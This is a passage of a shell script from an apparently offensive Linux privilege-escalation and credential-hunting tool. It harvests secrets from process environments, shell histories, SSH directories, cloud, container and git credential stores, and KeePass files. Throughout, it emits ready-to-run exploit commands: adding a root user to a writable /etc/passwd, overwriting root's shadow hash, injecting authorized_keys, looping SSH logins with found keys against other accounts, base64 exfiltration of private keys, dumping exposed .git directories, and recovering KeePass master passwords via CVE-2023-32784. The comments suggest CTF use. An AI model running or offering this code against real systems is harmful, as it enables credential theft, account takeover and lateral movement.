    local _CRED_PAT='(PASS(WORD)?|SECRET|TOKEN|API[_-]?KEY|AUTH(KEY|TOKEN)?|CREDENTIAL|PRIVATE[_-]?KEY|CERT[_-]?(PASS|KEY)|DATABASE_URL|DB_(PASS|URL|HOST|USER)|AWS_(SECRET|ACCESS)|GITHUB_TOKEN|GITLAB_TOKEN|SLACK_(TOKEN|SECRET)|STRIPE_(KEY|SECRET)|TWILIO|SENDGRID|MAILGUN|HEROKU_API|NPM_TOKEN|DOCKER_PASS|KUBE(RNETES)?_TOKEN|VAULT_TOKEN|CONSUL_TOKEN|REDIS_(PASS|URL)|MONGO(DB)?_(URI|URL|PASS)|MYSQL_ROOT_PASS|POSTGRES(QL)?_PASS|JDBC_URL|SPRING_DATASOURCE|LDAP_(PASS|BIND)|FTP_(PASS|USER)|SMTP_PASS|MAIL_PASS|OAUTH|JWT_SECRET|SIGNING_KEY|ENCRYPTION_KEY|MASTER_KEY|APP_SECRET|SESSION_SECRET)'

    for _envf in /proc/*/environ; do
        [ -r "$_envf" ] || continue
        _pid="${_envf#/proc/}"
        _pid="${_pid%/environ}"
        # Check process owner
        _uid=$(awk '/^Uid:/{print $2;exit}' "/proc/$_pid/status" 2>/dev/null)
        [ -z "$_uid" ] && continue

        tr '\0' '\n' < "$_envf" 2>/dev/null | \
        grep -iE "^${_CRED_PAT}=" | \
        grep -ivE '^(PATH|HOME|USER|SHELL|TERM|LANG|LC_|DISPLAY|XDG_|DBUS_|COLORTERM|LS_COLORS|LESSCLOSE|LESSOPEN|LOGNAME|MAIL|OLDPWD|PWD|SHLVL|_=)' | \
        while IFS= read -r _line; do
            _name="${_line%%=*}"
            _val="${_line#*=}"
            # Don't log the actual value — just flag that a credential var exists
            # with the pid and var name (operator can read /proc/PID/environ if needed)
            local _conf=78
            [ "$_uid" = "0" ] && _conf=88
            register_finding "ENV_CREDENTIAL" "$_envf" \
                "Credential env var \$${_name} in pid=$_pid (uid=$_uid): $(safe_output "${_val}" | cut -c1-40)..." \
                "$_conf" "credential"
        done
    done
    return 0
}

map_credential_history() {
    local _hf _line

    # Collect all readable history files across all users
    local _hfiles=""
    for _hf in \
        ~/.bash_history ~/.zsh_history ~/.sh_history ~/.ash_history \
        ~/.mysql_history ~/.psql_history ~/.python_history \
        ~/.irb_history ~/.node_repl_history \
        /root/.bash_history /root/.zsh_history
    do
        [ -r "$_hf" ] || continue
        [ -s "$_hf" ] || continue
        _hfiles="$_hfiles $_hf"
    done
    # Also check other users' histories if readable (misconfigured perms)
    for _hf in $(apex_find /home /root -maxdepth 3 \
                    -name '.bash_history' -o -name '.zsh_history' 2>/dev/null); do
        [ -r "$_hf" ] || continue
        case " $_hfiles " in *" $_hf "*) continue ;; esac
        _hfiles="$_hfiles $_hf"
    done

    for _hf in $_hfiles; do
        [ -r "$_hf" ] || continue

        # 1. Credentials in CLI arguments (passwords, tokens, DB URLs)
        grep -iE \
            "(mysql|sshpass|curl|wget|psql|mongo|redis-cli|sftp|ftp|svn|git|docker|kubectl).*(-p[[:space:]]|--password[=[:space:]])|:\/\/[^@]+:[^@]+@|(-u[[:space:]][^-][^[:space:]]*[[:space:]]+-p)" \
            "$_hf" 2>/dev/null | grep -v '^#' | head -20 | \
        while IFS= read -r _line; do
            register_finding "HISTORY_CRED" "$_hf" \
                "Credential pattern in history: $(safe_output "$_line" | cut -c1-120)" \
                72 "credential"
        done

        # 2. Unix socket usage (lateral pivot signal — socat, nc, python socket)
        grep -E "(socat.*unix[-:]|nc.*\.sock|python[23]?.*socket\.connect|\.sock[\"' ])" \
            "$_hf" 2>/dev/null | grep -v '^#' | head -10 | \
        while IFS= read -r _line; do
            register_finding "HISTORY_UNIX_SOCKET" "$_hf" \
                "Unix socket usage in history: $(safe_output "$_line" | cut -c1-120)" \
                75 "lateral"
        done

        # 3. SSH keygen / key injection (privilege escalation artifact)
        grep -E "(ssh-keygen|authorized_keys|ssh-copy-id|>> ~/.ssh/)" \
            "$_hf" 2>/dev/null | grep -v '^#' | head -10 | \
        while IFS= read -r _line; do
            register_finding "HISTORY_SSH_KEYGEN" "$_hf" \
                "SSH key operation in history: $(safe_output "$_line" | cut -c1-120)" \
                65 "credential"
        done

        # 4. Script replacement attempts (cron/service hijack artifacts)
        # Require line starts with redirect or overwrite — avoid Python os. false positives
        grep -E "^(> |printf .* > |tee |cat > |cp /bin/bash|chmod \+s)" \
            "$_hf" 2>/dev/null | grep -v 'import\|python\|\.py' | head -10 | \
        while IFS= read -r _line; do
            register_finding "HISTORY_SCRIPT_REPLACE" "$_hf" \
                "Possible past exploit/hijack attempt: $(safe_output "$_line" | cut -c1-120)" \
                55 "credential"
        done

        # 5. sudo -l run in history (attacker enumeration artifact)
        grep -E "^sudo -[ln]" "$_hf" 2>/dev/null | head -5 | \
        while IFS= read -r _line; do
            register_finding "HISTORY_SUDO_ENUM" "$_hf" \
                "Sudo enumeration in history: $(safe_output "$_line" | cut -c1-80)" \
                40 "credential"
        done
    done
    return 0
}

check_passwd_writable() {
    # CRITICAL-4
    if [ -e /etc/passwd ] && verify_actually_writable /etc/passwd 2>/dev/null; then
        register_finding "WRITABLE_PASSWD" "/etc/passwd" \
            "CRITICAL: /etc/passwd writable — append a passwordless UID-0 user" \
            99 "passwd_write"
        register_exploit "WRITABLE_PASSWD" "/etc/passwd" \
            "openssl passwd -1 -salt apex apex123 | xargs -I{} echo 'apex:{}:0:0:root:/root:/bin/bash' >> /etc/passwd && su - apex"
    fi
    return 0
}

check_shadow_writable() {
    if [ -e /etc/shadow ] && verify_actually_writable /etc/shadow 2>/dev/null; then
        register_finding "WRITABLE_SHADOW" "/etc/shadow" \
            "CRITICAL: /etc/shadow writable — replace root hash and su" \
            99 "shadow_write"
        register_exploit "WRITABLE_SHADOW" "/etc/shadow" \
            "Generate hash: openssl passwd -6 -salt apex apex123 ; sed -i 's|^root:[^:]*|root:<hash>|' /etc/shadow ; su - root"
    fi
    if [ -e /etc/shadow ] && [ -r /etc/shadow ]; then
        register_finding "READABLE_SHADOW" "/etc/shadow" \
            "/etc/shadow readable — crack hashes offline" 88 "shadow_read"
    fi
    return 0
}

check_global_env_files() {
    # MEDIUM-5
    local t
    for t in /etc/environment /etc/profile /etc/bash.bashrc \
             /etc/zsh/zshenv /etc/zsh/zshrc /etc/csh.login /etc/csh.cshrc; do
        [ -e "$t" ] || continue
        if verify_actually_writable "$t" 2>/dev/null; then
            register_finding "WRITABLE_GLOBAL_ENV" "$t" \
                "Global env file writable: $t — runs in every shell" 87 "global_env"
        fi
    done
    if [ -d /etc/profile.d ]; then
        if verify_actually_writable /etc/profile.d 2>/dev/null; then
            register_finding "WRITABLE_PROFILE_D_DIR" "/etc/profile.d" \
                "/etc/profile.d directory writable — drop login-time payload" \
                88 "profile_d"
        fi
    fi
    return 0
}

# ─── Credential hunt sub-scanners (see 13_CREDENTIAL_AND_SECRET_DETECTION.md) ─
# Each sub-scanner is independent, takes no args, and calls register_finding()
# directly. Confidence varies by source: SSH key ≥ DB cred ≥ env var.

_authkeys_inject_conf() {
    # Returns confidence for authorized_keys injection into $1 (a .ssh dir or
    # authorized_keys file). Returns 5 if target is owned by current user (not
    # privesc — you'd just be SSHing as yourself). Returns 10 if an
    # AuthorizedKeysCommand override is detected (EC2 trap). Otherwise returns
    # the confidence passed as $2 (default 90).
    local target="${1:-}"
    local base_conf="${2:-90}"
    # Own-dir check
    local owner
    owner=$(stat -c '%U' "$target" 2>/dev/null)
    local me
    me=$(id -un 2>/dev/null)
    if [ -n "$owner" ] && [ "$owner" = "$me" ]; then
        printf '%s' "5"
        return 0
    fi
    # EC2 / AuthorizedKeysCommand override
    if [ -n "${APEX_AUTHKEYS_OVERRIDE:-}" ]; then
        printf '%s' "10"
        return 0
    fi
    printf '%s' "$base_conf"
}

_ssh_key_intel() {
    # D1-D5: For a private key + sibling .ssh dir, emit:
    #   D1 SSH_KEY_PASSPHRASE_FREE — confirmed via ssh-keygen -y -P "" -f
    #   D2 SSH_KEY_PIVOT_CMD       — ready-to-paste ssh -i command per host
    #   D4 SSH_HOST_REACHABLE      — known_hosts entry confirmed via ssh-keygen -F
    #   D5 SSH_KEY_WORLD_READABLE  — chmod warning + base64 exfil template
    # Wired from scan_ssh_artifacts loop. Self-contained, additive, no side-effects.
    local keyfile="${1:-}"
    local sshdir="${2:-}"
    [ -r "$keyfile" ] || return 0

    # D1 — passphrase test (more reliable than grep ENCRYPTED for new openssh format)
    local pf_ok=0
    if command -v ssh-keygen >/dev/null 2>&1; then
        if safe_run 4 ssh-keygen -y -P "" -f "$keyfile" >/dev/null 2>&1; then
            pf_ok=1
            register_finding "SSH_KEY_PASSPHRASE_FREE" "$keyfile" \
                "Confirmed passphrase-free private key (ssh-keygen -y -P \"\" succeeded): $keyfile" \
                93 "cred_ssh"
        fi
    fi

    # D5 — world-readable private key (operator-side warning + safe exfil)
    local kperm
    kperm=$(stat -c '%a' "$keyfile" 2>/dev/null)
    case "$kperm" in
        ?[4-7]?|??[4-7])
            register_finding "SSH_KEY_WORLD_READABLE" "$keyfile" \
                "Private key world/group-readable (mode=$kperm): $keyfile — chmod 600 + exfil safely" \
                88 "cred_ssh_opsec"
            register_exploit "SSH_KEY_WORLD_READABLE" "$keyfile" \
                "chmod 600 $keyfile  # local hardening; off-box copy: cat $keyfile | base64 -w0"
            ;;
    esac

    # D2 + D4 — only useful when key is actually usable
    [ "$pf_ok" = "1" ] || return 0
    [ -d "$sshdir" ] || return 0

    # Collect candidate user@host pairs.
    # Sources: known_hosts neighbours, ssh config Host blocks.
    local cand_tmp="${APEX_TMP:-/tmp}/_ssh_cand_$$"
    : > "$cand_tmp"
    local owner
    owner=$(stat -c '%U' "$keyfile" 2>/dev/null)
    [ -z "$owner" ] && owner="<owner>"

    # Sources of host candidates
    local kh="$sshdir/known_hosts"
    if [ -r "$kh" ]; then
        # First field: host[,host2] possibly hashed (|1|...). Skip hashed entries
        # for D2 (cannot extract host); D4 still uses ssh-keygen -F.
        awk '!/^\|/ {print $1}' "$kh" 2>/dev/null | tr ',' '\n' | \
            sed -E 's/^\[//; s/\]:[0-9]+$//' | \
            grep -vE '^$' | sort -u | head -10 | while IFS= read -r h; do
                printf '%s|%s\n' "$owner" "$h" >> "$cand_tmp"
            done
    fi
    local sshconf="$sshdir/config"
    if [ -r "$sshconf" ]; then
        # Each Host alias + its HostName + User overrides
        awk '
            BEGIN{IGNORECASE=1}
            /^[[:space:]]*Host[[:space:]]/   {flush(); for(i=2;i<=NF;i++){if($i!~/[*?]/)hn[$i]=$i}}
            /^[[:space:]]*HostName[[:space:]]/{for(k in hn) hn[k]=$2}
            /^[[:space:]]*User[[:space:]]/   {for(k in hn) un[k]=$2}
            END{flush()}
            function flush(){for(k in hn){u=(k in un)?un[k]:""; printf "%s|%s\n",(u==""?"OWNER":u),hn[k]} delete hn; delete un}
        ' "$sshconf" 2>/dev/null | sed "s/^OWNER|/${owner}|/" >> "$cand_tmp"
    fi

    # D2 — emit one ready-to-paste ssh -i per (user,host)
    if [ -s "$cand_tmp" ]; then
        local cu ch seen=""
        while IFS='|' read -r cu ch; do
            [ -z "$ch" ] && continue
            case " $seen " in *" ${cu}@${ch} "*) continue ;; esac
            seen="$seen ${cu}@${ch}"
            register_finding "SSH_KEY_PIVOT_CMD" "$keyfile" \
                "Ready-to-use: ssh -i $keyfile -o StrictHostKeyChecking=no ${cu}@${ch}" \
                90 "cred_ssh_pivot"
            register_exploit "SSH_KEY_PIVOT_CMD" "$keyfile" \
                "chmod 600 $keyfile; ssh -i $keyfile -o StrictHostKeyChecking=no ${cu}@${ch}"
        done < "$cand_tmp"
    fi
    rm -f "$cand_tmp" 2>/dev/null

    # D4 — confirm hashed/plain known_hosts entries are reachable
    if [ -r "$kh" ] && command -v ssh-keygen >/dev/null 2>&1; then
        # For hashed entries, ssh-keygen -F can resolve by hostname.
        # We only have hashes — best we can do is offer the operator a hint
        # that hashed hosts exist. For plain entries we already emitted via D2.
        if grep -q '^|' "$kh" 2>/dev/null; then
            local hcount
            hcount=$(grep -c '^|' "$kh" 2>/dev/null)
            register_finding "SSH_KNOWN_HOSTS_HASHED" "$kh" \
                "$hcount hashed known_hosts entries — try: for h in <guesses>; do ssh-keygen -F \$h -f $kh; done" \
                35 "cred_ssh_pivot"
        fi
    fi

    return 0
}

test_ssh_key_pivot() {
    # Given an unencrypted private key $1, try to identify which user/host it
    # unlocks by cross-referencing public key against all authorized_keys files.
    # Self-matches (key matches owner's own authorized_keys) are skipped — we
    # already know the owner can use their key locally; we want pivots to
    # OTHER accounts.
    local keyfile="${1:-}"
    [ -r "$keyfile" ] || return 0
    local _self
    _self=$(id -un 2>/dev/null)
    # Extract public key fingerprint
    local fp
    fp=$(ssh-keygen -l -f "$keyfile" 2>/dev/null | awk '{print $2}')
    [ -z "$fp" ] && return 0
    # Search all authorized_keys for this fingerprint
    local h uhome uname
    if [ -r /etc/passwd ]; then
        while IFS=: read -r uname _ _ _ _ uhome _; do
            [ -z "$uname" ] && continue
            [ "$uname" = "$_self" ] && continue
            local ak="$uhome/.ssh/authorized_keys"
            [ -r "$ak" ] || continue
            if ssh-keygen -l -f "$ak" 2>/dev/null | grep -qF "$fp"; then
                register_finding "SSH_KEY_PIVOT_TARGET" "$keyfile" \
                    "Key $keyfile unlocks $uname@host (authorized_keys match: $ak)" \
                    97 "cred_ssh"
                register_exploit "SSH_KEY_PIVOT_TARGET" "$keyfile" \
                    "chmod 600 $keyfile; ssh -i $keyfile $uname@127.0.0.1"
            fi
        done < /etc/passwd
    fi
}

scan_ssh_artifacts() {
    # STEP 1: Detect AuthorizedKeysCommand FIRST — this overrides authorized_keys
    # injection entirely on AWS EC2 and similar cloud setups.
    if [ -r /etc/ssh/sshd_config ]; then
        local akc_line
        akc_line=$(grep -iE '^[[:space:]]*AuthorizedKeysCommand[[:space:]]' /etc/ssh/sshd_config 2>/dev/null | head -1)
        if [ -n "$akc_line" ]; then
            APEX_AUTHKEYS_OVERRIDE="$akc_line"
            register_finding "SSH_AUTHKEYS_CMD_OVERRIDE" "/etc/ssh/sshd_config" \
                "AuthorizedKeysCommand in sshd_config — authorized_keys injection likely BLOCKED: $akc_line" \
                0 "cred_ssh_trap"
        fi
    fi

    # Build list of SSH dirs from /etc/passwd home dirs + current $HOME + /root.
    local ssh_dirs="/root/.ssh"
    [ -n "$HOME" ] && [ -d "$HOME/.ssh" ] && ssh_dirs="$ssh_dirs $HOME/.ssh"
    if [ -r /etc/passwd ]; then
        local home
        while IFS=: read -r _ _ uid _ _ home _; do
            case "$uid" in ''|*[!0-9]*) continue ;; esac
            if [ "$uid" -ge 1000 ] || [ "$uid" -eq 0 ]; then
                [ -d "$home/.ssh" ] && ssh_dirs="$ssh_dirs $home/.ssh"
            fi
        done < /etc/passwd
    fi
    # Dedupe
    ssh_dirs=$(printf '%s\n' $ssh_dirs | sort -u | tr '\n' ' ')

    local _my_user _my_home
    _my_user=$(id -un 2>/dev/null)
    _my_home="${HOME:-/home/$_my_user}"

    local d kf authk known sshconf hk
    for d in $ssh_dirs; do
        [ -d "$d" ] || continue
        # Is this our OWN ~/.ssh? We still treat unencrypted keys here as
        # high-confidence privesc — a key in $HOME/.ssh frequently authorises
        # OTHER accounts on the same host (the layne→scott pattern). Only the
        # pivot test can confirm; do not silently downgrade.
        local _is_own=0
        case "$d" in
            "$_my_home/.ssh") _is_own=1 ;;
        esac
        # Private keys
        for kf in "$d"/id_rsa "$d"/id_ed25519 "$d"/id_ecdsa "$d"/id_dsa "$d"/id_xmss; do
            [ -r "$kf" ] || continue
            if grep -q "ENCRYPTED" "$kf" 2>/dev/null; then
                register_finding "SSH_KEY_ENCRYPTED" "$kf" \
                    "Encrypted SSH private key (passphrase) at $kf" 70 "cred_ssh"
            elif [ "$_is_own" = "1" ]; then
                # Operator-requested: do NOT filter own keys. CTF chains
                # routinely rely on layne's own ~/.ssh/id_rsa unlocking
                # scott's authorized_keys. Surface at high confidence with
                # explicit manual-check commands the operator can paste.
                register_finding "SSH_KEY_OWN" "$kf" \
                    "Own SSH private key at $kf — try ssh -i against EVERY other user/host. Manual checks: ssh-keygen -y -P '' -f $kf | head -1; for u in \$(awk -F: '\$3>=1000{print \$1}' /etc/passwd); do ssh -i $kf -o BatchMode=yes -o StrictHostKeyChecking=no \$u@127.0.0.1 id 2>&1 | head -1; done" \
                    78 "cred_ssh"
                register_exploit "SSH_KEY_OWN" "$kf" \
                    "ssh-keygen -y -P '' -f $kf > /tmp/_pub.\$\$  # confirm key unlocks
for u in \$(awk -F: '\$3>=1000 && \$1!=\"'\$(id -un)'\"{print \$1}' /etc/passwd); do
  ssh -i $kf -o BatchMode=yes -o StrictHostKeyChecking=no \$u@127.0.0.1 id 2>/dev/null && echo \"PWNED: \$u\"
done"
                test_ssh_key_pivot "$kf"
                _ssh_key_intel "$kf" "$d"
            else
                register_finding "SSH_KEY_CLEAR" "$kf" \
                    "Unencrypted SSH private key at $kf — usable immediately" \
                    95 "cred_ssh"
                register_exploit "SSH_KEY_CLEAR" "$kf" \
                    "chmod 600 $kf; ssh -i $kf <user>@<host>"
                test_ssh_key_pivot "$kf"
                _ssh_key_intel "$kf" "$d"
            fi
        done
        # Any file in .ssh containing BEGIN PRIVATE KEY (skip own)
        local f
        for f in "$d"/*; do
            [ -f "$f" ] || continue
            [ -r "$f" ] || continue
            [ "$_is_own" = "1" ] && continue
            grep -q "BEGIN.*PRIVATE KEY" "$f" 2>/dev/null && \
                register_finding "SSH_KEY_ANY" "$f" \
                    "Generic private key file: $f" 80 "cred_ssh"
        done
        # STEP 3: Root SSH key/dir checks
        if [ "$d" = "/root/.ssh" ]; then
            for kf in "$d"/id_rsa "$d"/id_ed25519 "$d"/id_ecdsa "$d"/id_dsa; do
                if [ -r "$kf" ] && ! grep -q "ENCRYPTED" "$kf" 2>/dev/null; then
                    register_finding "ROOT_SSH_KEY_CLEAR" "$kf" \
                        "Root unencrypted SSH private key readable: $kf" \
                        97 "cred_ssh"
                fi
            done
        fi
        # authorized_keys — STEP 5: skip own dir (not privesc)
        authk="$d/authorized_keys"
        if [ -f "$authk" ]; then
            if verify_actually_writable "$authk" 2>/dev/null; then
                local authk_conf
                authk_conf=$(_authkeys_inject_conf "$authk" 95)
                if [ "$authk_conf" -ge 15 ]; then
                    # STEP 6: check for from= IP restriction
                    local from_restrict=""
                    grep -qE '^from=' "$authk" 2>/dev/null && from_restrict="TRAP: from= IP restriction present in authorized_keys"
                    local desc="authorized_keys writable: $authk — inject pubkey, ssh in as owner"
                    [ -n "$from_restrict" ] && desc="$desc — WARNING: $from_restrict"
                    register_finding "AUTHKEYS_WRITABLE" "$authk" "$desc" \
                        "$authk_conf" "cred_ssh_inject"
                    register_exploit "AUTHKEYS_WRITABLE" "$authk" \
                        "echo '<your-ssh-pubkey>' >> $authk ; ssh -i <priv> <owner>@<host>"
                fi
            fi
        elif [ -d "$d" ] && verify_actually_writable "$d" 2>/dev/null; then
            local dir_conf
            dir_conf=$(_authkeys_inject_conf "$d" 92)
            if [ "$dir_conf" -ge 15 ]; then
                register_finding "AUTHKEYS_DIR_WRITABLE" "$d" \
                    ".ssh dir writable: $d — create authorized_keys" "$dir_conf" "cred_ssh_inject"
            fi
        fi
        # known_hosts as pivot map
        known="$d/known_hosts"
        [ -r "$known" ] && register_finding "KNOWN_HOSTS" "$known" \
            "known_hosts present — pivot map info" 30 "cred_ssh"
        # SSH config
        sshconf="$d/config"
        if [ -r "$sshconf" ]; then
            register_finding "SSH_CONFIG" "$sshconf" \
                "SSH config readable — hosts/users/identity files" 40 "cred_ssh"
            # Check IdentityFile entries
            grep -iE '^[[:space:]]*IdentityFile' "$sshconf" 2>/dev/null | awk '{print $2}' | \
            while IFS= read -r idf; do
                idf=$(printf '%s' "$idf" | sed "s|^~|$HOME|")
                [ -r "$idf" ] && ! grep -q "ENCRYPTED" "$idf" 2>/dev/null && \
                    register_finding "SSH_KEY_CLEAR" "$idf" \
                        "Unencrypted key from SSH config: $idf" 90 "cred_ssh"
            done
        fi
    done

    # SSH agent sockets owned by others
    if command -v find >/dev/null 2>&1; then
        local sock
        apex_find /tmp -type s -name "agent.*" 2>/dev/null | while IFS= read -r sock; do
            [ -r "$sock" ] && [ -w "$sock" ] && \
                register_finding "SSH_AGENT_HIJACK" "$sock" \
                    "SSH agent socket accessible: $sock — SSH_AUTH_SOCK hijack" \
                    93 "cred_ssh_agent"
        done
    fi

    # SSH host keys
    for hk in /etc/ssh/ssh_host_*_key; do
        [ -r "$hk" ] && register_finding "SSH_HOST_KEY" "$hk" \
            "SSH host private key readable: $hk — server impersonation" \
            85 "cred_ssh_host"
    done

    # STEP 4: Retroactive confidence downgrade if AuthorizedKeysCommand detected
    if [ -n "${APEX_AUTHKEYS_OVERRIDE:-}" ] && [ -d "${FINDINGS_DIR:-}" ]; then
        for _f in "$FINDINGS_DIR"/*.finding; do
            [ -f "$_f" ] || continue
            grep -qE '"type":"(AUTHKEYS_DIR_INJECT|AUTHKEYS_INJECT|AUTHKEYS_WRITABLE|AUTHKEYS_DIR_WRITABLE|HOME_INJECT)"' "$_f" 2>/dev/null || continue
            local _tmp="${_f}.tmp"
            sed 's/"confidence":[0-9]*/"confidence":10/' "$_f" > "$_tmp" 2>/dev/null && mv "$_tmp" "$_f"
        done
    fi
}

scan_history_files() {
    local histlist="$HOME/.bash_history $HOME/.zsh_history $HOME/.sh_history $HOME/.ash_history $HOME/.fish_history $HOME/.history $HOME/.mysql_history $HOME/.psql_history $HOME/.python_history $HOME/.irb_history $HOME/.node_repl_history $HOME/.sqlite_history /root/.bash_history /root/.zsh_history /root/.mysql_history"
    if [ -r /etc/passwd ]; then
        local home
        while IFS=: read -r _ _ uid _ _ home _; do
            case "$uid" in ''|*[!0-9]*) continue ;; esac
            [ "$uid" -ge 1000 ] && histlist="$histlist $home/.bash_history $home/.zsh_history"
        done < /etc/passwd
    fi
    local CRED_PATTERN='(mysql|psql).*-p[^ ]+|sshpass -p|openssl passwd|curl.*-u [^ ]+:|wget.*--password|ansible.*-e.*pass|chpasswd|htpasswd|TOKEN=|API_KEY=|PASSWORD=|PASS=|BEARER=|Authorization: Bearer|az login -p|gh auth login|kubectl.*--token'
    local h
    for h in $histlist; do
        [ -r "$h" ] || continue
        [ -s "$h" ] || continue
        # Generic pattern hits
        grep -nE "$CRED_PATTERN" "$h" 2>/dev/null | head -20 | while IFS= read -r line; do
            register_finding "HISTORY_CRED" "$h" \
                "History line with credential pattern: $(printf '%s' "$line" | cut -c1-160)" \
                72 "cred_history"
        done
        # Direct extractions
        grep -oE "mysql[^ ]* -p[^ ]+" "$h" 2>/dev/null | while IFS= read -r m; do
            register_finding "HISTORY_MYSQL_PASS" "$h" \
                "MySQL password in history: $m" 82 "cred_history"
        done
        grep -oE "sshpass -p ['\"]?[^'\" ]+" "$h" 2>/dev/null | while IFS= read -r s; do
            register_finding "HISTORY_SSHPASS" "$h" \
                "sshpass invocation in history: $s" 82 "cred_history"
        done
    done
}

scan_process_environ() {
    local CRED_VARS='PASSWORD|PASSWD|SECRET|TOKEN|API_KEY|AUTH|CREDENTIAL|DB_PASS|DATABASE_URL|PRIVATE_KEY|ACCESS_KEY|AWS_|GCP_|AZURE_|GITHUB_TOKEN|GITLAB_TOKEN|SLACK_TOKEN|STRIPE_|PAYPAL_|SENDGRID_|MAILGUN_|TWILIO_|HEROKU_API|VAULT_TOKEN|NPM_TOKEN|DOCKER_PASS|REGISTRY_AUTH|JENKINS_TOKEN|CIRCLE_TOKEN|TRAVIS_TOKEN'
    local pdir uid env_data var
    for pdir in /proc/[0-9]*/; do
        [ -r "${pdir}environ" ] || continue
        uid=$(awk '/^Uid:/{print $2; exit}' "${pdir}status" 2>/dev/null)
        # Brace-group the redirect: kernel may reject open() even when mode-bits
        # say readable. The 2>/dev/null on the redirect itself does not silence
        # the shell-level "Permission denied" — wrapping does.
        env_data=$({ tr '\0' '\n' < "${pdir}environ"; } 2>/dev/null)
        [ -z "$env_data" ] && continue
        printf '%s\n' "$env_data" | grep -E "^($CRED_VARS)" | head -5 | while IFS= read -r var; do
            register_finding "PROC_ENV_CRED" "${pdir}environ" \
                "Cred env in pid $(basename "$pdir") (uid=${uid:-?}): $(printf '%s' "$var" | cut -c1-120)" \
                70 "cred_environ"
        done
    done
}

scan_cloud_credentials() {
    local cf
    # AWS
    for cf in "$HOME/.aws/credentials" /root/.aws/credentials /etc/aws_credentials; do
        [ -r "$cf" ] && register_finding "AWS_CRED_FILE" "$cf" \
            "AWS credentials file readable: $cf" 92 "cred_cloud"
    done
    # GCP service-account JSON
    if [ -d "$HOME/.config/gcloud" ]; then
        register_finding "GCP_CONFIG_DIR" "$HOME/.config/gcloud" \
            "gcloud config dir present" 55 "cred_cloud"
    fi
    # Azure
    [ -r "$HOME/.azure/azureProfile.json" ] && register_finding "AZURE_PROFILE" \
        "$HOME/.azure/azureProfile.json" "Azure profile readable" 80 "cred_cloud"
    # kube
    [ -r "$HOME/.kube/config" ] && register_finding "KUBECONFIG" \
        "$HOME/.kube/config" "kubeconfig readable — cluster access" 88 "cred_cloud"
    # In-cluster service account token
    [ -r /var/run/secrets/kubernetes.io/serviceaccount/token ] && \
        register_finding "K8S_SA_TOKEN" \
            /var/run/secrets/kubernetes.io/serviceaccount/token \
            "In-cluster ServiceAccount token readable" 90 "cred_cloud"
    # Vault token
    [ -r "$HOME/.vault-token" ] && register_finding "VAULT_TOKEN" \
        "$HOME/.vault-token" "Vault token file readable" 88 "cred_cloud"
}

scan_container_secrets() {
    local dc="$HOME/.docker/config.json"
    [ -r "$dc" ] && register_finding "DOCKER_CONFIG" "$dc" \
        "Docker config.json readable — registry creds" 85 "cred_container"
    # /run/secrets/* — common docker swarm / k8s pattern
    if [ -d /run/secrets ]; then
        local s
        for s in /run/secrets/*; do
            [ -r "$s" ] && register_finding "RUN_SECRETS" "$s" \
                "Container secret readable: $s" 75 "cred_container"
        done
    fi
}

scan_database_credentials() {
    local f
    for f in "$HOME/.my.cnf" /root/.my.cnf /etc/mysql/my.cnf /etc/mysql/debian.cnf; do
        [ -r "$f" ] && register_finding "MYSQL_CNF" "$f" \
            "MySQL config readable: $f" 78 "cred_db"
    done
    for f in "$HOME/.pgpass" /root/.pgpass; do
        [ -r "$f" ] && register_finding "PGPASS" "$f" \
            "PostgreSQL .pgpass readable: $f" 80 "cred_db"
    done
    # debian.cnf often holds root mysql password
    [ -r /etc/mysql/debian.cnf ] && register_finding "MYSQL_DEBIAN_CNF" \
        /etc/mysql/debian.cnf "Debian MySQL admin password file" 88 "cred_db"
}

scan_git_credentials() {
    [ -r "$HOME/.git-credentials" ] && register_finding "GIT_CREDENTIALS_FILE" \
        "$HOME/.git-credentials" "git credentials store readable" 82 "cred_git"
    [ -r "$HOME/.gitconfig" ] && grep -q "credential" "$HOME/.gitconfig" 2>/dev/null && \
        register_finding "GIT_CONFIG_HAS_CRED" "$HOME/.gitconfig" \
            "gitconfig references credential helper" 50 "cred_git"
    # Mine commit history for accidentally committed secrets (spec: 13_CREDENTIAL_AND_SECRET_DETECTION.md)
    local repo hit
    apex_find / -maxdepth 6 -name ".git" -type d 2>/dev/null | head -10 | while IFS= read -r repo; do
        repo="${repo%/.git}"
        [ -r "${repo}/.git/HEAD" ] || continue
        # Webroot exposure — .git inside a served directory leaks source + history
        case "$repo" in
            /var/www/*|/srv/www/*|/srv/http/*|/usr/share/nginx/*|/opt/*www*|/home/*/public_html/*)
                register_finding "GIT_DIR_IN_WEBROOT" "$repo/.git" \
                    "Exposed .git in webroot: $repo/.git — clone via http://target/.git/ then dump source/history" \
                    85 "cred_git"
                register_exploit "GIT_DIR_IN_WEBROOT" "$repo/.git" \
                    "# From attacker:
# git-dumper http://TARGET/ ./loot   (or wget -r http://TARGET/.git/)
# Locally on victim:
git -C '$repo' log --all --oneline | head -30
git -C '$repo' log --all -p | grep -iE 'pass|secret|token|api[_-]?key' | head -40
git -C '$repo' show \$(git -C '$repo' rev-list --all | head -5)"
                ;;
        esac
        hit=$(safe_run 10 git -C "$repo" log --all --oneline -p -- . 2>/dev/null | \
              grep -iE "(password|passwd|secret|token|api_key|apikey|credential)\s*[=:]" | head -3)
        [ -n "$hit" ] && register_finding "GIT_SECRET_IN_HISTORY" "$repo" \
            "Secret pattern in git commit history: $(printf '%s' "$hit" | head -1 | cut -c1-120)" 88 "cred_git"
    done
}

scan_password_managers() {
    local f
    # KeePass
    apex_find / -maxdepth 6 -type f \( -name "*.kdbx" -o -name "*.kdb" \) 2>/dev/null | \
        head -10 | while IFS= read -r f; do
            [ -r "$f" ] && register_finding "KEEPASS_DB" "$f" \
                "KeePass database file: $f — crack offline (keepass2john + hashcat -m 13400)" 80 "cred_pwmgr"
        done
    # KeePass memory dump (CVE-2023-32784) — master password recoverable via keepass-dump-masterkey
    apex_find / -maxdepth 6 -type f \( -name "KeePassDumpFull*" -o -name "*KeePass*.dmp" \
        -o -name "*keepass*.dmp" \) 2>/dev/null | head -10 | while IFS= read -r f; do
            [ -r "$f" ] && register_finding "KEEPASS_MEMDUMP" "$f" \
                "KeePass memory dump: $f — recover master password via CVE-2023-32784 (keepass-dump-masterkey.py)" \
                90 "cred_pwmgr"
            register_exploit "KEEPASS_MEMDUMP" "$f" \
                "# CVE-2023-32784 — recover master password from KeePass 2.x memory dump
# python3 keepass-dump-masterkey.py '$f'
# (https://github.com/vdohney/keepass-password-dumper)
strings '$f' | grep -E '^.A$' | head -20
# Then download .kdbx + .dmp to attacker, run dumper, then keepass2john + hashcat"
        done
    # pass (Unix password manager)
    [ -d "$HOME/.password-store" ] && register_finding "PASS_STORE" \
